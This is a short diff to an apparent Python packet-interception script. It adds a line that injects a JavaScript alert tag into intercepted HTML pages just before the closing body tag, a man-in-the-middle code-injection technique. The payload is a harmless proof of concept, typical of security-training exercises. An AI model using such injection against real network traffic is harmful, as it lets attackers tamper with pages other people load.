@@ -53,7 +53,8 @@ def process_packet(packet):
             return
 
         added_text = "<script>alert('Javascript Injected successfully!');</script>"
-        
+
+        load = load.replace("</body>", added_text + "</body>")
 
 if __name__ == "__main__":
     import argparse
